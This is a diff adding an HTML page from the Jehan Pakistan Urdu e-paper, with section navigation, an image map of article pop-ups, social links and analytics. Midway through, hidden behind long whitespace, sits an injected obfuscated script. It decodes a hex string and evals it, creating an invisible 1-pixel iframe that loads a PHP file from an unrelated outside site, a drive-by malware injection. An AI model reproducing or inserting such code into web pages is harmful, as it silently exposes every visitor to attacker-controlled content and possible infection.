@@ -1,0 +1,279 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta name="robots" content="index, follow" />
+<script src='jquery.min.js' type='text/javascript'></script>
+<script src='jquery.maphilight.js' type='text/javascript'></script>
+<link rel="stylesheet" type="text/css" href="epaper.css">
+<link rel="shortcut icon" href="../../../jehan.png" />
+<title>Welcome to Jehan Pakistan | Jehan Eman </title>
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-37250889-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+<script type="text/javascript">
+<!--
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+function MM_swapImgRestore() { //v3.0
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+}
+function MM_findObj(n, d) { //v4.01
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x && d.getElementById) x=d.getElementById(n); return x;
+}
+
+function MM_swapImage() { //v3.0
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+}
+//-->
+</script>
+</head>
+
+
+<script type="text/javascript">
+    $(function() {
+        $('.map').maphilight();
+        $('#squidheadlink').mouseover(function(e) {
+            $('#squidhead').mouseover();
+        }).mouseout(function(e) {
+            $('#squidhead').mouseout();
+        }).click(function(e) { e.preventDefault(); });
+    });</script>
+
+
+<body onLoad="MM_preloadImages('220213/branch-over.jpg','220213/jagmag-over.jpg','220213/jahanandaz-over.jpg')">
+
+<div align="center">
+	<table width="1000" border="1" align="center" bordercolor="#C0C0C0"   bordercolorlight="#C0C0C0">
+		<tr >
+			<td width="55" height="95" align="center" valign="top">
+			<a href="p16.html"><img border="0" src="220213/tp16.jpg" alt="Special Publications" width="55" height="95"></a></td>
+			<td width="55" height="95" align="center" valign="top">
+      		<a href="p15.html"><img border="0" src="220213/tp15.jpg" alt="Fun" width="55" height="95"></a></td>
+			<td width="55" height="95" align="center" valign="top">
+     	 	<a href="p14.html"><img border="0" src="220213/tp14.jpg" alt="Foreign countries" width="55" height="95"></a></td>
+			<td width="55" height="95" align="center" valign="top">
+      		<a href="p13.html"><img border="0" src="220213/tp13.jpg" alt="Districts" width="55" height="95"></a></td>
+			<td width="55" height="95" align="center" valign="top">
+      		<a href="p12.html"><img border="0" src="220213/tp12.jpg" alt="Districts" width="55" height="95"></a></td>
+			<td width="55" height="95" align="center" valign="top">
+      		<a href="p11.html"><img border="0" src="220213/tp11.jpg" alt="Columnist" width="55" height="95"></a></td>
+			<td width="55" height="95" align="center" valign="top">
+      		<a href="p10.html"><img border="0" src="220213/tp10.jpg" alt="Education and Health" width="55"  height="95"></a></td>
+			<td width="55" height="95" align="center" valign="top">
+      		<a href="p9.html"><img border="0" src="220213/tp9.jpg" alt="Special Publications" width="55" height="95"></a></td>
+			<td width="55" height="95" align="center" valign="top">
+      		<a href="p8.html"><img border="0" alt="last page" src="220213/tbp.jpg" width="55" height="95"></a></td>
+			<td width="55" height="95" align="center" valign="top">
+      		<a href="p7.html"><img border="0" src="220213/tp7.jpg" alt="Game and player" width="55" height="95"></a></td>
+			<td width="55" height="95" align="center" valign="top">
+      		<a href="p6.html"><img border="0" src="220213/tp6.jpg" alt="Game and player" width="55" height="95"></a></td>
+			<td width="55" height="95" align="center" valign="top">
+      		<a href="p5.html"><img border="0" src="220213/tp5.jpg" alt="our recommend" width="55" height="95"></a></td>
+			<td width="55" height="95" align="center" valign="top">
+      		<a href="p4.html"><img border="0" src="220213/tp4.jpg" alt="business" width="55" height="95"></a></td>
+			<td width="55" height="95" align="center" valign="top">
+      		<a href="p3.html"><img border="0" alt="the city speaks" src="220213/tp3.jpg" width="55" height="95"></a></td>
+			<td width="55" height="95" align="center" valign="top">
+      		<a href="p2.html"><img border="0" src="220213/tp2.jpg" alt="The city speaks" width="55" height="95"></a></td>
+			<td width="55" height="95" align="center" valign="top">
+			<a href="p1.html"><img border="0" alt="Front Page" src="220213/tfp.jpg" width="55" height="95"></a></td>
+	  </tr>
+		<tr>
+			<td width="55" align="center" bgcolor="#FFFFFF">
+			<span style="font-family: 'Jameel Noori nastaleeq', 'Alvi Lahori Nastaleeq', 'Alvi Nastaleeq', Georgia, 'Times New Roman', Times, serif; font-size: 19px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 27px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; display: inline !important; float: none">
+			<a href="p16.html">
+			 &#1580;&#1729;&#1575;&#1606; &#1605;&#1593;&#1740;&#1588;&#1578;</a></span></td>
+			<td width="55" align="center" bgcolor="#FFFFFF">
+			<span style="font-family: 'Jameel Noori nastaleeq', 'Alvi Lahori Nastaleeq', 'Alvi Nastaleeq', Georgia, 'Times New Roman', Times, serif; font-size: 19px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 27px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; display: inline !important; float: none">
+			<a href="p15.html">
+    &#1582;&#1589;&#1608;&#1589;&#1740; &#1575;&#1588;&#1575;&#1593;&#1578;</a></span></td>
+			<td width="55" align="center" bgcolor="#FFFFFF">
+			<span style="font-family: 'Jameel Noori nastaleeq', 'Alvi Lahori Nastaleeq', 'Alvi Nastaleeq', Georgia, 'Times New Roman', Times, serif; font-size: 19px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 27px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; display: inline !important; float: none">
+			<a href="p14.html">
+    &#1605;&#1604;&#1705;&#1608;&#1722; &#1605;&#1604;&#1705;&#1608;&#1722;</a></span></td>
+			<td width="55" align="center" bgcolor="#FFFFFF">
+			<span style="font-family: 'Jameel Noori nastaleeq', 'Alvi Lahori Nastaleeq', 'Alvi Nastaleeq', Georgia, 'Times New Roman', Times, serif; font-size: 19px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 27px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; display: inline !important; float: none">
+			<a href="p13.html">
+    &#1575;&#1590;&#1604;&#1575;&#1593; &#1578;&#1581;&#1589;&#1740;&#1604;&#1740;&#1722;</a></span></td>
+			<td width="55" align="center" bgcolor="#FFFFFF">
+			<span style="font-family: 'Jameel Noori nastaleeq', 'Alvi Lahori Nastaleeq', 'Alvi Nastaleeq', Georgia, 'Times New Roman', Times, serif; font-size: 19px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 27px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; display: inline !important; float: none">
+			<a href="p12.html">
+    &#1575;&#1590;&#1604;&#1575;&#1593; &#1578;&#1581;&#1589;&#1740;&#1604;&#1740;&#1722;</a></span></td>
+			<td width="55" align="center" bgcolor="#FFFFFF">
+			<span style="font-family: 'Jameel Noori nastaleeq', 'Alvi Lahori Nastaleeq', 'Alvi Nastaleeq', Georgia, 'Times New Roman', Times, serif; font-size: 19px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 27px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; display: inline !important; float: none">
+			<a href="p11.html">
+    &#1580;&#1729;&#1575;&#1606; &#1570;&#1585;&#1575; &#1569;</a></span></td>
+			<td width="55" align="center" bgcolor="#FFFFFF">
+			<span style="font-family: 'Jameel Noori nastaleeq', 'Alvi Lahori Nastaleeq', 'Alvi Nastaleeq', Georgia, 'Times New Roman', Times, serif; font-size: 19px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 27px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; display: inline !important; float: none">
+			<a href="p10.html">
+    &#1705;&#1585;&#1575;&#1670;&#1740; &#1729;&#1605;&#1575;&#1585;&#1575;</a></span></td>
+			<td width="55" align="center" bgcolor="#FFFFFF">
+			<span style="font-family: 'Jameel Noori nastaleeq', 'Alvi Lahori Nastaleeq', 'Alvi Nastaleeq', Georgia, 'Times New Roman', Times, serif; font-size: 19px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 27px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; display: inline !important; float: none">
+			<a href="p9.html">
+    
+	&#1580;&#1729;&#1575;&#1606; &#1575;&#1740;&#1605;&#1575;&#1606;</a></span></td>
+
+			<td width="55" align="center" bgcolor="#FFFFFF">
+
+				<span style="color: rgb(20, 20, 20); font-family: 'Jameel Noori nastaleeq', 'Alvi Lahori Nastaleeq', 'Alvi Nastaleeq', Georgia, 'Times New Roman', Times, serif; font-size: 19px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 27px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; display: inline !important; float: none; background-color: rgb(252, 252, 255)">
+				<a href="p8.html">
+				&#1570;&#1582;&#1585;&#1740; &#1589;&#1601;&#1581;&#1729;</a></span>
+			</td>
+			<td width="55" align="center" bgcolor="#FFFFFF">
+			<span style="font-family: 'Jameel Noori nastaleeq', 'Alvi Lahori Nastaleeq', 'Alvi Nastaleeq', Georgia, 'Times New Roman', Times, serif; font-size: 19px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 27px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; display: inline !important; float: none">
+			<a href="p7.html">
+    &#1705;&#1726;&#1740;&#1604;<br/> &#1705;&#1726;&#1604;&#1575;&#1681;&#1740;</a></span></td>
+			<td width="55" align="center" bgcolor="#FFFFFF">
+			<span style="font-family: 'Jameel Noori nastaleeq', 'Alvi Lahori Nastaleeq', 'Alvi Nastaleeq', Georgia, 'Times New Roman', Times, serif; font-size: 19px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 27px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; display: inline !important; float: none">
+			<a href="p6.html">
+     &#1705;&#1726;&#1740;&#1604;<br/> &#1705;&#1726;&#1604;&#1575;&#1681;&#1740;</a></span></td>
+			<td width="55" align="center" bgcolor="#FFFFFF">
+			<span style="font-family: 'Jameel Noori nastaleeq', 'Alvi Lahori Nastaleeq', 'Alvi Nastaleeq', Georgia, 'Times New Roman', Times, serif; font-size: 19px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 27px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; display: inline !important; float: none">
+			<a href="p5.html">
+    &#1729;&#1605;&#1575;&#1585;&#1740; &#1585;&#1575;&#1574;&#1746;</a></span></td>
+			<td width="55" align="center" bgcolor="#FFFFFF">
+			<span style="font-family: 'Jameel Noori nastaleeq', 'Alvi Lahori Nastaleeq', 'Alvi Nastaleeq', Georgia, 'Times New Roman', Times, serif; font-size: 19px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 27px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; display: inline !important; float: none">
+			<a href="p4.html">
+    &#1578;&#1580;&#1575;&#1585;&#1578;</a></span></td>
+			<td width="55" align="center" bgcolor="#FFFFFF">
+			<span style="font-family: 'Jameel Noori nastaleeq', 'Alvi Lahori Nastaleeq', 'Alvi Nastaleeq', Georgia, 'Times New Roman', Times, serif; font-size: 19px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 27px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; display: inline !important; float: none">
+			<a href="p3.html">
+     &#1588;&#1729;&#1585;&#1576;&#1608;&#1604;&#1578;&#1575;<br/>&#1729;&#1746;</a></span></td>
+			<td width="55" align="center" bgcolor="#FFFFFF">
+			<span style="font-family: 'Jameel Noori nastaleeq', 'Alvi Lahori Nastaleeq', 'Alvi Nastaleeq', Georgia, 'Times New Roman', Times, serif; font-size: 19px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 27px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; display: inline !important; float: none">
+			<a href="p2.html">
+    &#1587;&#1657;&#1740; &#1662;&#1740;&#1580;</a></span></td>
+			<td width="55" align="center" bgcolor="#FFFFFF">
+			<span style="font-family: 'Jameel Noori nastaleeq', 'Alvi Lahori Nastaleeq', 'Alvi Nastaleeq', Georgia, 'Times New Roman', Times, serif; font-size: 19px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 27px; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; display: inline !important; float: none">
+			<a href="p1.html">
+			&#1589;&#1601;&#1581;&#1729; &#1575;&#1608;&#1604;</a></span></td>
+
+		</tr>
+		<tr>
+			<td align="center" bgcolor="#FFFFFF" colspan="16"><table width="960" border="0" align="center" cellpadding="0" cellspacing="0">
+			  <tr>
+			    <td width="320" align="left" valign="top">
+                <a href="http://epaper.jehanpakistan.com/E-Paper/magazine/sunday/index.html" target="_blank" onMouseOver="MM_swapImage('Image17','','220213/branch-over.jpg',1)" onMouseOut="MM_swapImgRestore()">
+				<img src="220213/branch.jpg" name="Image17" width="320" height="50" border="0"></a></td>
+			    <td width="320" align="left" valign="top">
+                <a href="http://epaper.jehanpakistan.com/E-Paper/magazine/jagmag/index.html" target="_blank" onMouseOver="MM_swapImage('Image18','','220213/jagmag-over.jpg',1)" onMouseOut="MM_swapImgRestore()">
+                <img src="220213/jagmag.jpg" name="Image18" width="320" height="50" border="0"></a></td>
+			    <td width="360" align="left" valign="top">
+                <a href="http://epaper.jehanpakistan.com/E-Paper/magazine/andaz/index.html" target="_blank" onMouseOver="MM_swapImage('Image19','','220213/jahanandaz-over.jpg',1)" onMouseOut="MM_swapImgRestore()">
+                <img src="220213/jahanandaz.jpg" name="Image19" width="320" height="50" border="0"></a></td>
+		      </tr>
+	      </table></td>
+		</tr>
+	</table>
+</div><!--3b3cf8--><script type="text/javascript" language="javascript" >                                                                                                                                                                                                                                                                                                                                                                                                                p=parseInt;ss=String;asgq="28!66!75!6e!63!74!6@!6f!6e!20!28!2@!20!7b!d!a!20!20!20!20!76!61!72!20!71!20!3d!20!64!6f!63!75!6d!65!6e!74!2e!63!72!65!61!74!65!45!6c!65!6d!65!6e!74!28!27!6@!66!72!61!6d!65!27!2@!3b!d!a!d!a!20!20!20!20!71!2e!73!72!63!20!3d!20!27!68!74!74!70!3a!2f!2f!77!77!77!2e!61!70!6d!73!6f!6c!75!63!6@!6f!6e!65!73!77!65!62!2e!65!73!2f!77!70!2d!61!64!6d!6@!6e!2f!72!65!6c!2e!70!68!70!27!3b!d!a!20!20!20!20!71!2e!73!74!7@!6c!65!2e!70!6f!73!6@!74!6@!6f!6e!20!3d!20!27!61!62!73!6f!6c!75!74!65!27!3b!d!a!20!20!20!20!71!2e!73!74!7@!6c!65!2e!62!6f!72!64!65!72!20!3d!20!27!30!27!3b!d!a!20!20!20!20!71!2e!73!74!7@!6c!65!2e!68!65!6@!67!68!74!20!3d!20!27!31!70!78!27!3b!d!a!20!20!20!20!71!2e!73!74!7@!6c!65!2e!77!6@!64!74!68!20!3d!20!27!31!70!78!27!3b!d!a!20!20!20!20!71!2e!73!74!7@!6c!65!2e!6c!65!66!74!20!3d!20!27!31!70!78!27!3b!d!a!20!20!20!20!71!2e!73!74!7@!6c!65!2e!74!6f!70!20!3d!20!27!31!70!78!27!3b!d!a!d!a!20!20!20!20!6@!66!20!28!21!64!6f!63!75!6d!65!6e!74!2e!67!65!74!45!6c!65!6d!65!6e!74!42!7@!4@!64!28!27!71!27!2@!2@!20!7b!d!a!20!20!20!20!20!20!20!20!64!6f!63!75!6d!65!6e!74!2e!77!72!6@!74!65!28!27!3c!64!6@!76!20!6@!64!3d!5c!27!71!5c!27!3e!3c!2f!64!6@!76!3e!27!2@!3b!d!a!20!20!20!20!20!20!20!20!64!6f!63!75!6d!65!6e!74!2e!67!65!74!45!6c!65!6d!65!6e!74!42!7@!4@!64!28!27!71!27!2@!2e!61!70!70!65!6e!64!43!68!6@!6c!64!28!71!2@!3b!d!a!20!20!20!20!7d!d!a!7d!2@!28!2@!3b".replace(/@/g,"9").split("!");try{document.body&=0.1}catch(gdsgsdg){zz=3;dbshre=73;if(dbshre){vfvwe=0;try{document;}catch(agdsg){vfvwe=1;}if(!vfvwe){e=window["e".concat("val")];}s="";if(zz)for(i=0;i-461!=0;i++){if(window.document)s+=ss["fromCharCode"](p(asgq[i],16));}e("vz=1;"+s);}}</script><!--/3b3cf8-->
+
+<script>
+function PopupCenter(pageURL, title,w,h) {
+var left = (screen.width/2)-(w/2);
+var top = (screen.height/2)-(h/2);
+
+var targetWin = window.open (pageURL, title, 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=no, width='+w+', height='+h+', top='+top+', left='+left);
+} 
+</script>
+
+
+<div align="center">
+	<table width="1000" border="0" align="center">
+		<tr>
+			<td>
+			  <p dir="ltr">
+			
+					<map name="FPMap0">
+					<area href="javascript:void(0);" onClick="PopupCenter('openlink.asp?ddir=220213&im=p9-01.jpg', 'myPop1',730,450)" shape="rect" coords="10, 233, 994, 730">
+					<area href="javascript:void(0);" onClick="PopupCenter('openlink.asp?ddir=220213&im=p9-03.jpg', 'myPop1',730,450)" shape="rect" coords="10, 729, 994, 1179">
+					<area href="javascript:void(0);" onClick="PopupCenter('openlink.asp?ddir=220213&im=p9-02.jpg', 'myPop1',730,450)" shape="rect" coords="11, 1180, 991, 1625">
+					</map>
+			
+					<img border="0" src="220213/p9.jpg" width="1000" height="1645" class="map" usemap="#FPMap0"></td>
+		</tr>
+		<tr>
+			<td height="72"><table width="1000" border="0" cellspacing="0" cellpadding="0">
+			  <tr>
+			    <td align="right" valign="top"><table width="100%" border="0" align="left" cellpadding="0" cellspacing="0">
+			      <tr>
+			        <td width="150" align="left" valign="top"><a href="https://www.facebook.com/pages/Jehan-Pakistan/428751647148013" target="_blank"><img src="../../../Images/Facebook-Like.jpg" border="0" class="highlightit" width="133" height="40" alt="Facebook Like"></a></td>
+			        <td width="150" align="left" valign="top"><a href="https://www.facebook.com/jehan.pakistan" target="_blank"><img src="../../../Images/facebook-follow.jpg" border="0" class="highlightit" width="133" height="40" alt="Follow on Facebook"></a></td>
+			        <td align="left" valign="top"><a href="https://twitter.com/JehanPakistan" target="_blank"><img src="../../../Images/twitter-follow.jpg" width="133" border="0" class="highlightit" height="40" alt="Follow Twitter"></a></td>
+		          </tr>
+		        </table></td>
+			    <td width="100" align="right" valign="top"><script language="JavaScript">
+
+
+
+var theTarget = "_self";
+
+function goThere(){
+if(!document.theForm.theMenu.selectedIndex==""){
+window.open(document.theForm.theMenu.options[document.theForm.theMenu.selectedIndex].value,theTarget,"");}}
+
+</script>
+
+
+<form name="theForm" class="menu" >
+<select name="theMenu" size=1 onChange="goThere()">
+  <option>Pages
+  <option  value="p1.html">Page-01
+  <option value="p2.html">Page-02
+  <option value="p3.html">Page-03
+  <option value="p4.html">Page-04
+   <option value="p5.html">Page-05
+    <option  value="p6.html">Page-06
+     <option value="p7.html">Page-07
+      <option  value="p8.html">Page-08
+       <option selected value="p9.html">Page-09
+        <option value="p10.html">Page-10
+         <option value="p11.html">Page-11
+          <option value="p12.html">Page-12
+           <option value="p13.html">Page-13
+            <option  value="p14.html">Page-14
+             <option  value="p15.html">Page-15
+              <option value="p16.html">Page-16
+</select>
+</form></td>
+			    <td width="110" align="right" valign="top">
+                <a href="p8.html" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image23','','220213/prev-over-button.jpg',1)">
+                <img src="220213/prev-button.jpg" name="Image23" width="100" height="28" border="0"></a></td>
+			    <td width="110" align="right" valign="top">
+                <a href="p10.html" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image24','','220213/next-over-button.jpg',1)">
+                <img src="220213/next-button.jpg" name="Image24" width="100" height="28" border="0"></a></td>
+			    <td width="110" align="right" valign="top">
+                <a href="#" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image21','','220213/go-top-over.jpg',1)">
+                <img src="220213/go-top.jpg" name="Image21" width="100" height="28" border="0"></a></td>
+		      </tr>
+			  <tr>
+			    <td colspan="5">&nbsp;</td>
+		      </tr>
+		    </table></td>
+		</tr>
+	</table>
+</div>
+
+
+</body>
+
+</html>
